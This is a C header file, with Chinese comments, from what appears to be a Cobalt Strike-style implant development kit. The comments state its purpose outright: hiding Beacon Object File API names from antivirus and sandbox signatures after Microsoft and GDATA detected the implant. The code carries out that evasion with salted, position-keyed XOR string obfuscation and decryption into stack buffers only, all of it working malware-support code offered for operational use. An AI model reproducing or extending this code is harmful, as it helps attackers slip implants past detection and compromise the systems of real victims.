/* csdev :: cs_obf.h  --  编译期字符串混淆 (纯 ASCII, 无外部依赖)
 *
 * 动机（有实测依据）:
 *   微步/TI 沙箱对植入体的家族判定高度依赖**明文字符串**。实测报告里
 *   Microsoft 给的是 `VirTool:Win64/MeterBof.A`、GDATA 给的是
 *   `Generic.CoffLoader.Marte.A` —— 两者都指向同一件事: 二进制里有
 *   `BeaconDataParse` / `BeaconOutput` / `__imp_` 这一整张明文的 BOF API 名表。
 *   `strings` 一眼能捞出来, 规则作者只需要写一次匹配。
 *
 * 做法:
 *   编译期按"每串独立盐 + 位置相关密钥"异或, 明文不出现在 .rdata;
 *   运行期原地比较(不落地明文)或还原到调用方栈缓冲(必须交给 WinAPI 时)。
 *   不引入解密循环峰值(每次几十字节), 不改导入表, 不依赖任何库。
 *
 * 生成: tools/gen_obf_names.ps1 扫源码里的名字清单 -> kits/beacon/cs_obf_names.h
 *       (名单变了要重跑, gen_payload2.ps1 已自动带上)
 *
 * 说明: 这**不是**加密, 是提高自动化检测的成本。对专为我们写的规则无效,
 *       但对"扫字符串判家族"的通用引擎有效 —— 而那正是当前被检出的原因。
 */
#ifndef CSDEV_CS_OBF_H
#define CSDEV_CS_OBF_H

/* 位置相关密钥: 与每串自己的盐混合, 避免"整表同一个 XOR 常量"被一眼反解 */
static unsigned char cs_obf_key(unsigned char salt, unsigned int i)
{
    unsigned int k = (unsigned int)salt + (i * 7u) + 0x5Au;
    k ^= (k >> 5);
    return (unsigned char)(k & 0xFFu);
}

/* 比较: 混淆串 enc(长度 nlen) 是否等于明文 plain。不落地明文。 */
static int cs_obf_eq(const unsigned char *enc, unsigned int nlen, const char *plain)
{
    unsigned int i;
    unsigned char salt;
    if (enc == 0 || plain == 0) return 0;
    salt = enc[nlen]; /* 盐存在数组最后一个字节 */
    for (i = 0; i < nlen; i++) {
        if ((char)(enc[i] ^ cs_obf_key(salt, i)) != plain[i]) return 0;
        if (plain[i] == '\0') return 0;
    }
    return plain[nlen] == '\0'; /* 明文必须在此结束, 否则只是前缀相同 */
}

/* 还原到调用方提供的缓冲(必须交给 WinAPI 时用)。cap 至少 nlen+1。
 * 返回 dst; 空间不足返回 0。 */
static char *cs_obf_dec(char *dst, unsigned int cap, const unsigned char *enc, unsigned int nlen)
{
    unsigned int i;
    unsigned char salt;
    if (dst == 0 || enc == 0 || cap < nlen + 1u) return 0;
    salt = enc[nlen];
    for (i = 0; i < nlen; i++) dst[i] = (char)(enc[i] ^ cs_obf_key(salt, i));
    dst[nlen] = '\0';
    return dst;
}

/* 单次使用的"临时解密"宏: 声明栈缓冲 + 还原。用于把名字交给 CreateProcess /
 * GetProcAddress 这类必须吃明文的 API。作用域内有效, 用完即弃。 */
#define CS_OBF_TMP(var, enc) \
    char var[(sizeof(enc) > 1u) ? (sizeof(enc)) : 2u]; \
    (void)cs_obf_dec(var, (unsigned int)sizeof(var), (enc), (unsigned int)(sizeof(enc) - 1u))

/* 比较宏: cs_obf_eq 的长度取自数组本身 */
#define CS_OBF_MATCH(enc, plain) cs_obf_eq((enc), (unsigned int)(sizeof(enc) - 1u), (plain))

#endif /* CSDEV_CS_OBF_H */
